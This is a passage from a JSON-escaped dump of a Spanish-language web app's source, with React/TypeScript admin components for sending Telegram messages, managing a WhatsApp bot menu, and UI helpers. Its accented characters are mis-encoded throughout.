isActive: boolean;\n  role: string;\n}\n\nexport function MessageSender() {\n  const [selectedUser, setSelectedUser] = useState<string>('');\n  const [message, setMessage] = useState('');\n  const [isSending, setIsSending] = useState(false);\n  const [selectedFile, setSelectedFile] = useState<File | null>(null);\n  const [sendToAll, setSendToAll] = useState(false);\n  const { toast } = useToast();\n\n  // Obtener lista de usuarios\n  const { data: users = [], isLoading } = useQuery<User[]>({\n    queryKey: ['/api/admin/users'],\n    staleTime: 30000, // 30 segundos\n  });\n\n  // Filtrar usuarios que tienen Chat ID configurado\n  const usersWithChatId = users.filter(user => \n    user.telegramChatId && \n    user.telegramChatId !== '' && \n    user.role === 'user' // Solo usuarios regulares\n  );\n\n  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {\n    const file = e.target.files?.[0];\n    if (file) {\n      const maxSize = 50 * 1024 * 1024; // 50MB\n      if (file.size > maxSize) {\n        toast({\n          title: \"Error\",\n          description: \"El archivo no debe exceder 50MB\",\n          variant: \"destructive\"\n        });\n        return;\n      }\n      setSelectedFile(file);\n    }\n  };\n\n  const handleSendMessage = async () => {\n    if (!sendToAll && !selectedUser) {\n      toast({\n        title: \"Error\",\n        description: \"Selecciona un usuario o activa env铆o masivo\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n\n    if (!message.trim() && !selectedFile) {\n      toast({\n        title: \"Error\",\n        description: \"Escribe un mensaje o adjunta un archivo\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n\n    setIsSending(true);\n    try {\n      const formData = new FormData();\n      formData.append('message', message.trim());\n      \n      if (sendToAll) {\n        formData.append('sendToAll', 'true');\n      } else {\n        formData.append('username', selectedUser);\n      }\n      \n      if (selectedFile) {\n        formData.append('file', selectedFile);\n      }\n\n      const response = await fetch('/api/admin/send-message', {\n        method: 'POST',\n        credentials: 'include',\n        body: formData\n      });\n\n      const result = await response.json();\n\n      if (response.ok && result.success) {\n        const recipientInfo = sendToAll \n          ? `${result.sentCount || 0} usuarios` \n          : selectedUser;\n        \n        toast({\n          title: \" Mensaje enviado\",\n          description: `Mensaje enviado correctamente a ${recipientInfo}`,\n        });\n        \n        // Limpiar formulario\n        setSelectedUser('');\n        setMessage('');\n        setSelectedFile(null);\n        setSendToAll(false);\n      } else {\n        throw new Error(result.message || 'Error enviando mensaje');\n      }\n    } catch (error: any) {\n      console.error('Error enviando mensaje:', error);\n      toast({\n        title: \" Error\",\n        description: error.message || 'Error al enviar el mensaje',\n        variant: \"destructive\"\n      });\n    } finally {\n      setIsSending(false);\n    }\n  };\n\n  const handleKeyPress = (e: React.KeyboardEvent) => {\n    if (e.key === 'Enter' && e.ctrlKey) {\n      handleSendMessage();\n    }\n  };\n\n  if (isLoading) {\n    return (\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center gap-2\">\n            <MessageCircleIcon className=\"h-5 w-5\" />\n            Enviar Mensaje a Usuario\n          </CardTitle>\n        </CardHeader>\n        <CardContent>\n          <div className=\"text-center text-muted-foreground\">Cargando usuarios...</div>\n        </CardContent>\n      </Card>\n    );\n  }\n\n  return (\n    <Card>\n      <CardHeader>\n        <CardTitle className=\"flex items-center gap-2\">\n          <MessageCircleIcon className=\"h-5 w-5\" />\n          Enviar Mensaje a Usuario\n        </CardTitle>\n        <CardDescription>\n          Env铆a mensajes personalizados a usuarios registrados con Chat ID configurado\n        </CardDescription>\n      </CardHeader>\n      <CardContent className=\"space-y-4\">\n        {usersWithChatId.length === 0 ? (\n          <Alert>\n            <UsersIcon className=\"h-4 w-4\" />\n            <AlertDescription>\n              No hay usuarios con Chat ID configurado disponibles para enviar mensajes.\n            </AlertDescription>\n          </Alert>\n        ) : (\n          <>\n            <div className=\"space-y-2\">\n              <div className=\"flex items-center gap-2\">\n                <input\n                  type=\"checkbox\"\n                  id=\"send-to-all\"\n                  checked={sendToAll}\n                  onChange={(e) => {\n                    setSendToAll(e.target.checked);\n                    if (e.target.checked) {\n                      setSelectedUser('');\n                    }\n                  }}\n                  className=\"w-4 h-4\"\n                  data-testid=\"checkbox-send-to-all\"\n                />\n                <Label htmlFor=\"send-to-all\" className=\"cursor-pointer\">\n                  Enviar a todos los usuarios ({usersWithChatId.length})\n                </Label>\n              </div>\n            </div>\n\n            {!sendToAll && (\n              <div className=\"space-y-2\">\n                <Label htmlFor=\"user-select\">Usuario destinatario</Label>\n                <Select value={selectedUser} onValueChange={setSelectedUser}>\n                  <SelectTrigger data-testid=\"select-user\">\n                    <SelectValue placeholder=\"Selecciona un usuario\" />\n                  </SelectTrigger>\n                  <SelectContent>\n                    {usersWithChatId.map((user) => (\n                      <SelectItem key={user.id} value={user.username}>\n                        <div className=\"flex items-center gap-2\">\n                          <span>{user.username}</span>\n                          <span className=\"text-xs text-muted-foreground\">\n                            ({user.isActive ? 'Activo' : 'Inactivo'})\n                          </span>\n                        </div>\n                      </SelectItem>\n                    ))}\n                  </SelectContent>\n                </Select>\n                <div className=\"text-xs text-muted-foreground\">\n                  {usersWithChatId.length} usuario(s) con Chat ID configurado\n                </div>\n              </div>\n            )}\n\n            <div className=\"space-y-2\">\n              <Label htmlFor=\"message-input\">Mensaje (opcional si adjuntas archivo)</Label>\n              <Textarea\n                id=\"message-input\"\n                data-testid=\"input-message\"\n                value={message}\n                onChange={(e) => setMessage(e.target.value)}\n                onKeyDown={handleKeyPress}\n                placeholder=\"Escribe tu mensaje aqu铆...\"\n                rows={4}\n                className=\"resize-none\"\n              />\n              <div className=\"text-xs text-muted-foreground\">\n                Presiona Ctrl+Enter para enviar r谩pidamente\n              </div>\n            </div>\n\n            <div className=\"space-y-2\">\n              <Label htmlFor=\"file-input\">Archivo adjunto (opcional)</Label>\n              <div className=\"flex items-center gap-2\">\n                <Input\n                  id=\"file-input\"\n                  type=\"file\"\n                  onChange={handleFileChange}\n                  className=\"flex-1\"\n                  data-testid=\"input-file\"\n                  accept=\"*/*\"\n                />\n                {selectedFile && (\n                  <Button\n                    variant=\"ghost\"\n                    size=\"sm\"\n                    onClick={() => setSelectedFile(null)}\n                    data-testid=\"button-remove-file\"\n                  >\n                    <X className=\"h-4 w-4\" />\n                  </Button>\n                )}\n              </div>\n              {selectedFile && (\n                <div className=\"flex items-center gap-2 p-2 bg-muted rounded text-sm\">\n                  <FileIcon className=\"h-4 w-4\" />\n                  <span>{selectedFile.name}</span>\n                  <span className=\"text-muted-foreground\">\n                    ({(selectedFile.size / 1024 / 1024).toFixed(2)} MB)\n                  </span>\n                </div>\n              )}\n              <div className=\"text-xs text-muted-foreground\">\n                Tama帽o m谩ximo: 50MB\n              </div>\n            </div>\n\n            <div className=\"flex gap-2\">\n              <Button \n                onClick={handleSendMessage}\n                disabled={isSending || (!sendToAll && !selectedUser) || (!message.trim() && !selectedFile)}\n                className=\"flex-1\"\n                data-testid=\"button-send-message\"\n              >\n                <SendIcon className=\"mr-2 h-4 w-4\" />\n                {isSending ? 'Enviando...' : sendToAll ? 'Enviar a Todos' : 'Enviar Mensaje'}\n              </Button>\n              \n              <Button \n                variant=\"outline\"\n                onClick={() => {\n                  setSelectedUser('');\n                  setMessage('');\n                  setSelectedFile(null);\n                  setSendToAll(false);\n                }}\n                disabled={isSending}\n                data-testid=\"button-clear\"\n              >\n                Limpiar\n              </Button>\n            </div>\n\n            {sendToAll && (\n              <Alert>\n                <UsersIcon className=\"h-4 w-4\" />\n                <AlertDescription>\n                  El mensaje se enviar谩 v铆a Telegram a <strong>todos los {usersWithChatId.length} usuarios</strong> con Chat ID configurado.\n                </AlertDescription>\n              </Alert>\n            )}\n\n            {selectedUser && !sendToAll && (\n              <Alert>\n                <MessageCircleIcon className=\"h-4 w-4\" />\n                <AlertDescription>\n                  El mensaje se enviar谩 v铆a Telegram al usuario <strong>{selectedUser}</strong> \n                  e incluir谩 tu nombre como remitente y @BalonxSistema como contacto de soporte.\n                </AlertDescription>\n              </Alert>\n            )}\n          </>\n        )}\n      </CardContent>\n    </Card>\n  );\n}","size_bytes":10934},"client/src/hooks/use-device-orientation.tsx":{"content":"import * as React from \"react\";\n\n// Definimos tipos para la orientaci贸n del dispositivo\nexport type DeviceOrientation = 'portrait' | 'landscape' | 'unknown';\n\nexport function useDeviceOrientation() {\n  const [orientation, setOrientation] = React.useState<DeviceOrientation>('unknown');\n\n  React.useEffect(() => {\n    // Funci贸n para determinar la orientaci贸n actual\n    const updateOrientation = () => {\n      if (window.matchMedia(\"(orientation: portrait)\").matches) {\n        setOrientation('portrait');\n      } else if (window.matchMedia(\"(orientation: landscape)\").matches) {\n        setOrientation('landscape');\n      } else {\n        // Para escritorio o casos donde la orientaci贸n no est谩 bien definida\n        setOrientation(window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');\n      }\n    };\n\n    // Actualizar orientaci贸n inicialmente\n    updateOrientation();\n\n    // Escuchar cambios de orientaci贸n\n    const handleOrientationChange = () => {\n      updateOrientation();\n    };\n\n    // Evento de cambio de orientaci贸n y cambio de tama帽o\n    window.addEventListener('orientationchange', handleOrientationChange);\n    window.addEventListener('resize', handleOrientationChange);\n\n    return () => {\n      window.removeEventListener('orientationchange', handleOrientationChange);\n      window.removeEventListener('resize', handleOrientationChange);\n    };\n  }, []);\n\n  return orientation;\n}\n\n// Hook combinado que devuelve informaci贸n sobre el dispositivo\nexport function useDeviceInfo() {\n  const [deviceInfo, setDeviceInfo] = React.useState({\n    isMobile: false,\n    isLandscape: false,\n    isPortrait: false,\n    screenWidth: 0\n  });\n\n  React.useEffect(() => {\n    const updateDeviceInfo = () => {\n      const width = window.innerWidth;\n      const height = window.innerHeight;\n      const isMobile = width < 768;\n      const isLandscape = width > height;\n      \n      setDeviceInfo({\n        isMobile,\n        isLandscape,\n        isPortrait: !isLandscape,\n        screenWidth: width\n      });\n    };\n    \n    // Actualizar inicialmente\n    updateDeviceInfo();\n    \n    // Escuchar eventos de cambio\n    window.addEventListener('resize', updateDeviceInfo);\n    window.addEventListener('orientationchange', updateDeviceInfo);\n    \n    return () => {\n      window.removeEventListener('resize', updateDeviceInfo);\n      window.removeEventListener('orientationchange', updateDeviceInfo);\n    };\n  }, []);\n  \n  return deviceInfo;\n}","size_bytes":2462},"client/src/components/ui/separator.tsx":{"content":"import * as React from \"react\"\nimport * as SeparatorPrimitive from \"@radix-ui/react-separator\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Separator = React.forwardRef<\n  React.ElementRef<typeof SeparatorPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof SeparatorPrimitive.Root>\n>(\n  (\n    { className, orientation = \"horizontal\", decorative = true, ...props },\n    ref\n  ) => (\n    <SeparatorPrimitive.Root\n      ref={ref}\n      decorative={decorative}\n      orientation={orientation}\n      className={cn(\n        \"shrink-0 bg-border\",\n        orientation === \"horizontal\" ? \"h-[1px] w-full\" : \"h-full w-[1px]\",\n        className\n      )}\n      {...props}\n    />\n  )\n)\nSeparator.displayName = SeparatorPrimitive.Root.displayName\n\nexport { Separator }\n","size_bytes":756},"client/src/components/ui/pagination.tsx":{"content":"import * as React from \"react\"\nimport { ChevronLeft, ChevronRight, MoreHorizontal } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\nimport { ButtonProps, buttonVariants } from \"@/components/ui/button\"\n\nconst Pagination = ({ className, ...props }: React.ComponentProps<\"nav\">) => (\n  <nav\n    role=\"navigation\"\n    aria-label=\"pagination\"\n    className={cn(\"mx-auto flex w-full justify-center\", className)}\n    {...props}\n  />\n)\nPagination.displayName = \"Pagination\"\n\nconst PaginationContent = React.forwardRef<\n  HTMLUListElement,\n  React.ComponentProps<\"ul\">\n>(({ className, ...props }, ref) => (\n  <ul\n    ref={ref}\n    className={cn(\"flex flex-row items-center gap-1\", className)}\n    {...props}\n  />\n))\nPaginationContent.displayName = \"PaginationContent\"\n\nconst PaginationItem = React.forwardRef<\n  HTMLLIElement,\n  React.ComponentProps<\"li\">\n>(({ className, ...props }, ref) => (\n  <li ref={ref} className={cn(\"\", className)} {...props} />\n))\nPaginationItem.displayName = \"PaginationItem\"\n\ntype PaginationLinkProps = {\n  isActive?: boolean\n} & Pick<ButtonProps, \"size\"> &\n  React.ComponentProps<\"a\">\n\nconst PaginationLink = ({\n  className,\n  isActive,\n  size = \"icon\",\n  ...props\n}: PaginationLinkProps) => (\n  <a\n    aria-current={isActive ? \"page\" : undefined}\n    className={cn(\n      buttonVariants({\n        variant: isActive ? \"outline\" : \"ghost\",\n        size,\n      }),\n      className\n    )}\n    {...props}\n  />\n)\nPaginationLink.displayName = \"PaginationLink\"\n\nconst PaginationPrevious = ({\n  className,\n  ...props\n}: React.ComponentProps<typeof PaginationLink>) => (\n  <PaginationLink\n    aria-label=\"Go to previous page\"\n    size=\"default\"\n    className={cn(\"gap-1 pl-2.5\", className)}\n    {...props}\n  >\n    <ChevronLeft className=\"h-4 w-4\" />\n    <span>Previous</span>\n  </PaginationLink>\n)\nPaginationPrevious.displayName = \"PaginationPrevious\"\n\nconst PaginationNext = ({\n  className,\n  ...props\n}: React.ComponentProps<typeof PaginationLink>) => (\n  <PaginationLink\n    aria-label=\"Go to next page\"\n    size=\"default\"\n    className={cn(\"gap-1 pr-2.5\", className)}\n    {...props}\n  >\n    <span>Next</span>\n    <ChevronRight className=\"h-4 w-4\" />\n  </PaginationLink>\n)\nPaginationNext.displayName = \"PaginationNext\"\n\nconst PaginationEllipsis = ({\n  className,\n  ...props\n}: React.ComponentProps<\"span\">) => (\n  <span\n    aria-hidden\n    className={cn(\"flex h-9 w-9 items-center justify-center\", className)}\n    {...props}\n  >\n    <MoreHorizontal className=\"h-4 w-4\" />\n    <span className=\"sr-only\">More pages</span>\n  </span>\n)\nPaginationEllipsis.displayName = \"PaginationEllipsis\"\n\nexport {\n  Pagination,\n  PaginationContent,\n  PaginationEllipsis,\n  PaginationItem,\n  PaginationLink,\n  PaginationNext,\n  PaginationPrevious,\n}\n","size_bytes":2751},"client/src/components/admin/WhatsAppBotPanel.tsx":{"content":"import { useState, useEffect } from \"react\";\nimport { useQuery, useMutation } from \"@tanstack/react-query\";\nimport { apiRequest, queryClient } from \"@/lib/queryClient\";\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from \"@/components/ui/card\";\nimport { Button } from \"@/components/ui/button\";\nimport { Input } from \"@/components/ui/input\";\nimport { Label } from \"@/components/ui/label\";\nimport { Textarea } from \"@/components/ui/textarea\";\nimport { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from \"@/components/ui/select\";\nimport { Plus, Trash2, Send, Save, MessageSquare, QrCode, Power, CheckCircle, XCircle, ChevronRight, ChevronDown, Link as LinkIcon } from \"lucide-react\";\nimport { useToast } from \"@/hooks/use-toast\";\nimport type { WhatsappConfig, WhatsappMenuOption } from \"@shared/schema\";\n\ninterface MenuOptionEdit extends Partial<WhatsappMenuOption> {\n  isNew?: boolean;\n  hasChanges?: boolean;\n}\n\nexport default function WhatsAppBotPanel() {\n  const { toast } = useToast();\n  const [testNumber, setTestNumber] = useState(\"5531781885\");\n  const [welcomeMessage, setWelcomeMessage] = useState(\"\");\n  const [phoneNumber, setPhoneNumber] = useState(\"\");\n  const [editedOptions, setEditedOptions] = useState<MenuOptionEdit[]>([]);\n  const [expandedMenus, setExpandedMenus] = useState<Set<number>>(new Set());\n  const [hasUnsavedChanges, setHasUnsavedChanges] = useState(false);\n\n  // Obtener configuraci贸n\n  const { data: config, isLoading: loadingConfig } = useQuery<WhatsappConfig>({\n    queryKey: [\"/api/whatsapp/config\"],\n  });\n\n  // Obtener opciones de men煤\n  const { data: menuOptions = [], isLoading: loadingMenu } = useQuery<WhatsappMenuOption[]>({\n    queryKey: [\"/api/whatsapp/menu\"],\n  });\n\n  // Obtener estado de conexi贸n (polling cada 3 segundos)\n  const { data: status } = useQuery<{ isConnected: boolean; qrCode: string | null; phoneNumber: string }>({\n    queryKey: [\"/api/whatsapp/status\"],\n    refetchInterval: 3000,\n  });\n\n  // Sincronizar valores cuando carga la configuraci贸n\n  useEffect(() => {\n    if (config) {\n      setWelcomeMessage(config.welcomeMessage || \"\");\n      setPhoneNumber(config.phoneNumber || \"\");\n    }\n  }, [config]);\n\n  // Sincronizar opciones editables con las opciones del servidor\n  useEffect(() => {\n    if (menuOptions.length > 0 && editedOptions.length === 0) {\n      setEditedOptions(menuOptions.map(opt => ({ ...opt, hasChanges: false })));\n    }\n  }, [menuOptions]);\n\n  // Mutaci贸n para actualizar configuraci贸n\n  const updateConfigMutation = useMutation({\n    mutationFn: async (data: { welcomeMessage: string; phoneNumber: string }) => {\n      return await apiRequest(\"POST\", \"/api/whatsapp/config\", data);\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: [\"/api/whatsapp/config\"] });\n      toast({\n        title: \"Configuraci贸n guardada\",\n        description: \"La configuraci贸n de WhatsApp ha sido actualizada.\",\n      });\n    },\n    onError: () => {\n      toast({\n        title: \"Error\",\n        description: \"No se pudo guardar la configuraci贸n.\",\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  // Mutaci贸n para iniciar/detener bot\n  const startStopBotMutation = useMutation({\n    mutationFn: async (action: \"start\" | \"stop\") => {\n      return await apiRequest(\"POST\", `/api/whatsapp/${action}`);\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: [\"/api/whatsapp/status\"] });\n      queryClient.invalidateQueries({ queryKey: [\"/api/whatsapp/config\"] });\n    },\n    onError: () => {\n      toast({\n        title: \"Error\",\n        description: \"No se pudo realizar la acci贸n.\",\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  // Mutaci贸n para enviar mensaje de prueba\n  const sendTestMessageMutation = useMutation({\n    mutationFn: async () => {\n      return await apiRequest(\"POST\", \"/api/whatsapp/send-test\", { phoneNumber: testNumber });\n    },\n    onSuccess: () => {\n      toast({\n        title: \"Mensaje enviado\",\n        description: `Mensaje de prueba enviado a ${testNumber}`,\n      });\n    },\n    onError: () => {\n      toast({\n        title: \"Error\",\n        description: \"No se pudo enviar el mensaje de prueba.\",\n        variant: \"destructive\",\n      });\n    },\n  });\n\n  const handleSaveConfig = () => {\n    updateConfigMutation.mutate({ welcomeMessage, phoneNumber });\n  };\n\n  const handleSendTestMessage = () => {\n    if (!testNumber || testNumber.trim() === \"\") {\n      toast({\n        title: \"Error\",\n        description: \"Por favor ingresa un n煤mero de tel茅fono.\",\n        variant: \"destructive\",\n      });\n      return;\n    }\n    sendTestMessageMutation.mutate();\n  };\n\n  const handleStartStop = (action: \"start\" | \"stop\") => {\n    startStopBotMutation.mutate(action);\n  };\n\n  // Agregar nueva opci贸n al men煤 principal o sub-men煤\n  const handleAddOption = (parentId: number | null = null) => {\n    const newOptionNumber = editedOptions.filter(opt => \n      (parentId === null ? !opt.parentId : opt.parentId === parentId)\n    ).length + 1;\n\n    const newOption: MenuOptionEdit = {\n      userId: config?.userId || 1,\n      parentId: parentId,\n      optionNumber: newOptionNumber,\n      optionText: \"Nueva opci贸n\",\n      actionType: \"message\",\n      responseMessage: \"\",\n      commandType: null,\n      isActive: true,\n      isNew: true,\n      hasChanges: true,\n    };\n\n    setEditedOptions([...editedOptions, newOption]);\n    setHasUnsavedChanges(true);\n  };\n\n  // Actualizar opci贸n editada\n  const handleUpdateOption = (index: number, field: string, value: any) => {\n    const updated = [...editedOptions];\n    updated[index] = { ...updated[index], [field]: value, hasChanges: true };\n    setEditedOptions(updated);\n    setHasUnsavedChanges(true);\n  };\n\n  // Eliminar opci贸n\n  const handleDeleteOption = (index: number) => {\n    const updated = [...editedOptions];\n    updated.splice(index, 1);\n    setEditedOptions(updated);\n    setHasUnsavedChanges(true);\n  };\n\n  // Guardar todos los cambios\n  const handleSaveAllChanges = async () => {\n    try {\n      // Primero, eliminar opciones que no est谩n en editedOptions pero est谩n en menuOptions\n      const deletedOptions = menuOptions.filter(\n        opt => !editedOptions.find(edited => edited.id === opt.id)\n      );\n      \n      for (const deleted of deletedOptions) {\n        if (deleted.id) {\n          await apiRequest(\"DELETE\", `/api/whatsapp/menu/${deleted.id}`);\n        }\n      }\n\n      // Crear o actualizar opciones\n      for (const option of editedOptions) {\n        if (option.hasChanges || option.isNew) {\n          if (option.isNew || !option.id) {\n            // Crear nueva opci贸n\n            const { isNew, hasChanges, id, createdAt, updatedAt, ...data } = option;\n            await apiRequest(\"POST\", \"/api/whatsapp/menu\", data);\n          } else {\n            // Actualizar opci贸n existente\n            const { isNew, hasChanges, id, createdAt, updatedAt, ...data } = option;\n            await apiRequest(\"PUT\", `/api/whatsapp/menu/${id}`, data);\n          }\n        }\n      }\n\n      await queryClient.invalidateQueries({ queryKey: [\"/api/whatsapp/menu\"] });\n      setHasUnsavedChanges(false);\n      \n      toast({\n        title: \"Cambios guardados\",\n        description: \"Todas las opciones del men煤 han sido actualizadas.\",\n      });\n    } catch (error) {\n      toast({\n        title: \"Error\",\n        description: \"No se pudieron guardar todos los cambios.\",\n        variant: \"destructive\",\n      });\n    }\n  };\n\n  // Toggle expandir/colapsar men煤\n  const toggleExpand = (menuId: number) => {\n    const newExpanded = new Set(expandedMenus);\n    if (newExpanded.has(menuId)) {\n      newExpanded.delete(menuId);\n    } else {\n      newExpanded.add(menuId);\n    }\n    setExpandedMenus(newExpanded);\n  };\n\n  // Renderizar una opci贸n de men煤 (con soporte para sub-men煤s)\n  const renderMenuOption = (option: MenuOptionEdit, index: number, level: number = 0) => {\n    const hasChildren = editedOptions.some(opt => opt.parentId === option.id);\n    const isExpanded = option.id ? expandedMenus.has(option.id) : false;\n    const childOptions = editedOptions.filter(opt => opt.parentId === option.id);\n\n    return (\n      <div key={index} className=\"space-y-2\">\n        <Card className={`${level > 0 ? 'ml-8 border-l-4 border-l-primary/30' : ''}`}>\n          <CardContent className=\"p-4 space-y-3\">\n            {/* Header con bot贸n de expandir si tiene hijos */}\n            <div className=\"flex items-center justify-between\">\n              <div className=\"flex items-center gap-2\">\n                {hasChildren && (\n                  <Button\n                    variant=\"ghost\"\n                    size=\"sm\"\n                    onClick={() => option.id && toggleExpand(option.id)}\n                    data-testid={`button-toggle-${index}`}\n                  >\n                    {isExpanded ? <ChevronDown className=\"w-4 h-4\" /> : <ChevronRight className=\"w-4 h-4\" />}\n                  </Button>\n                )}\n                <span className=\"font-semibold\">\n                  {level > 0 ? `${option.optionNumber} (Sub-men煤)` : `Opci贸n ${option.optionNumber}`}\n                </span>\n              </div>\n              <div className=\"flex gap-2\">\n                {/* Bot贸n para agregar sub-men煤 - disponible para mensaje y submenu */}\n                {(option.actionType === 'submenu' || option.actionType === 'message') && (\n                  <Button\n                    variant=\"outline\"\n                    size=\"sm\"\n                    onClick={() => handleAddOption(option.id || null)}\n                    data-testid={`button-add-submenu-${index}`}\n                  >\n                    <Plus className=\"w-4 h-4 mr-1\" />\n                    Agregar Opci贸n\n                  </Button>\n                )}\n                <Button\n                  variant=\"ghost\"\n                  size=\"sm\"\n                  onClick={() => handleDeleteOption(index)}\n                  data-testid={`button-delete-${index}`}\n                >\n                  <Trash2 className=\"w-4 h-4 text-destructive\" />\n                </Button>\n              </div>\n            </div>\n\n            {/* Campos de edici贸n */}\n            <div className=\"grid grid-cols-2 gap-4\">\n              <div className=\"space-y-2\">\n                <Label>N煤mero</Label>\n                <Input\n                  type=\"number\"\n                  value={option.optionNumber}\n                  onChange={(e) => handleUpdateOption(index, \"optionNumber\", parseInt(e.target.value))}\n                  data-testid={`input-number-${index}`}\n                />\n              </div>\n              <div className=\"space-y-2\">\n                <Label>Texto de la opci贸n</Label>\n                <Input\n                  value={option.optionText}\n                  onChange={(e) => handleUpdateOption(index, \"optionText\", e.target.value)}\n                  data-testid={`input-text-${index}`}\n                />\n              </div>\n            </div>\n\n            <div className=\"space-y-2\">\n              <Label>Tipo de acci贸n</Label>\n              <Select\n                value={option.actionType}\n                onValueChange={(value) => handleUpdateOption(index, \"actionType\", value)}\n              >\n                <SelectTrigger data-testid={`select-action-${index}`}>\n                  <SelectValue />\n                </SelectTrigger>\n                <SelectContent>\n                  <SelectItem value=\"message\">Mensaje</SelectItem>\n                  <SelectItem value=\"transfer\">Transferir a ejecutivo</SelectItem>\n                  <SelectItem value=\"info\">Informaci贸n (vuelve al men煤)</SelectItem>\n                  <SelectItem value=\"submenu\">Sub-men煤</SelectItem>\n                </SelectContent>\n              </Select>\n            </div>\n\n            {/* Campo de respuesta solo para ciertos tipos */}\n            {(option.actionType === 'message' || option.actionType === 'info' || option.actionType === 'transfer') && (\n              <div className=\"space-y-2\">\n                <Label>Mensaje de respuesta</Label>\n                <Textarea\n                  rows={3}\n                  value={option.responseMessage || \"\"}\n                  onChange={(e) => handleUpdateOption(index, \"responseMessage\", e.target.value)}\n                  placeholder=\"Escribe el mensaje que se enviar谩 cuando se seleccione esta opci贸n...\"\n                  data-testid={`textarea-response-${index}`}\n                />\n                <p className=\"text-xs text-muted-foreground flex items-center gap-1\">\n                  <LinkIcon className=\"w-3 h-3\" />\n                  Puedes usar <code className=\"bg-muted px-1 rounded\">(liga)</code> en tu mensaje para insertar la 煤ltima liga del panel\n                </p>\n                {hasChildren && (\n                  <p className=\"text-xs text-blue-600 dark:text-blue-400 flex items-center gap-1\">\n                    癸 Esta opci贸n mostrar谩 el sub-men煤 despu茅s de enviar el mensaje\n                  </p>\n                )}\n              </div>\n            )}\n\n            {option.actionType === 'submenu' && !hasChildren && (\n              <div className=\"p-3 bg-muted rounded-lg text-sm text-muted-foreground\">\n                Este men煤 a煤n no tiene opciones. Haz clic en \"Sub-men煤\" para agregar.\n              </div>\n            )}\n          </CardContent>\n        </Card>\n\n        {/* Renderizar sub-men煤s si est谩n expandidos */}\n        {hasChildren && isExpanded && (\n          <div className=\"space-y-2\">\n            {childOptions.map((childOption, childIndex) => {\n              const actualIndex = editedOptions.indexOf(childOption);\n              return renderMenuOption(childOption, actualIndex, level + 1);\n            })}\n          </div>\n        )}\n      </div>\n    );\n  };\n\n  const mainMenuOptions = editedOptions.filter(opt => !opt.parentId);\n\n  return (\n    <div className=\"space-y-6\">\n      {/* Estado de Conexi贸n */}\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center gap-2\">\n            <Power className=\"w-5 h-5\" />\n            Estado de Conexi贸n\n          </CardTitle>\n          <CardDescription>\n            Estado actual del bot de WhatsApp\n          </CardDescription>\n        </CardHeader>\n        <CardContent className=\"space-y-4\">\n          <div className=\"flex items-center justify-between\">\n            <div className=\"flex items-center gap-3\">\n              {status?.isConnected ? (\n                <>\n                  <CheckCircle className=\"w-6 h-6 text-green-500\" />\n                  <div>\n                    <p className=\"font-medium\">Conectado</p>\n                    {status?.phoneNumber && (\n                      <p className=\"text-sm text-muted-foreground\">\n                        N煤mero: {status.phoneNumber}\n                      </p>\n                    )}\n                  </div>\n                </>\n              ) : (\n                <>\n                  <XCircle className=\"w-6 h-6 text-red-500\" />\n                  <div>\n                    <p className=\"font-medium\">Desconectado</p>\n                    <p className=\"text-sm text-muted-foreground\">\n                      El bot no est谩 conectado\n                    </p>\n                  </div>\n                </>\n              )}\n            </div>\n            <div className=\"flex gap-2\">\n              {status?.isConnected ? (\n                <Button\n                  variant=\"destructive\"\n                  onClick={() => handleStartStop(\"stop\")}\n                  disabled={startStopBotMutation.isPending}\n                  data-testid=\"button-stop-bot\"\n                >\n                  <Power className=\"w-4 h-4 mr-2\" />\n                  Detener Bot\n                </Button>\n              ) : (\n                <Button\n                  onClick={() => handleStartStop(\"start\")}\n                  disabled={startStopBotMutation.isPending}\n                  data-testid=\"button-start-bot\"\n                >\n                  <Power className=\"w-4 h-4 mr-2\" />\n                  Iniciar Bot\n                </Button>\n              )}\n            </div>\n          </div>\n\n          {/* QR Code */}\n          {status?.qrCode && !status?.isConnected && (\n            <div className=\"flex flex-col items-center gap-4 p-6 bg-muted rounded-lg\">\n              <QrCode className=\"w-8 h-8 text-primary\" />\n              <p className=\"text-sm font-medium\">Escanea este c贸digo QR con WhatsApp</p>\n              <img\n                src={status.qrCode}\n                alt=\"QR Code\"\n                className=\"w-64 h-64 bg-white p-4 rounded-lg\"\n                data-testid=\"qr-code-image\"\n              />\n              <p className=\"text-xs text-muted-foreground\">\n                WhatsApp  Dispositivos vinculados  Vincular un dispositivo\n              </p>\n            </div>\n          )}\n        </CardContent>\n      </Card>\n      {/* Configuraci贸n */}\n      <Card>\n        <CardHeader>\n          <CardTitle>Configuraci贸n del Bot</CardTitle>\n          <CardDescription>\n            Configura el mensaje de bienvenida y el n煤mero de WhatsApp\n          </CardDescription>\n        </CardHeader>\n        <CardContent className=\"space-y-4\">\n          <div className=\"space-y-2\">\n            <Label htmlFor=\"welcome-message\">Mensaje de Bienvenida</Label>\n            <Textarea\n              id=\"welcome-message\"\n              rows={3}\n              value={welcomeMessage}\n              onChange={(e) => setWelcomeMessage(e.target.value)}\n              placeholder=\"隆Hola! Bienvenido a nuestro servicio...\"\n              data-testid=\"textarea-welcome-message\"\n            />\n          </div>\n\n          <div className=\"space-y-2\">\n            <Label htmlFor=\"phone-number\">N煤mero de WhatsApp (opcional)</Label>\n            <Input\n              id=\"phone-number\"\n              value={phoneNumber}\n              onChange={(e) => setPhoneNumber(e.target.value)}\n              placeholder=\"521234567890\"\n              data-testid=\"input-phone-number\"\n            />\n          </div>\n\n          <Button\n            onClick={handleSaveConfig}\n            disabled={updateConfigMutation.isPending}\n            data-testid=\"button-save-config\"\n          >\n            <Save className=\"w-4 h-4 mr-2\" />\n            Guardar Configuraci贸n\n          </Button>\n        </CardContent>\n      </Card>\n      {/* Opciones del Men煤 */}\n      <Card>\n        <CardHeader>\n          <div className=\"flex items-center justify-between\">\n            <div>\n              <CardTitle>Opciones del Men煤</CardTitle>\n              <CardDescription>\n                Configura las opciones del men煤 principal y sub-men煤s\n              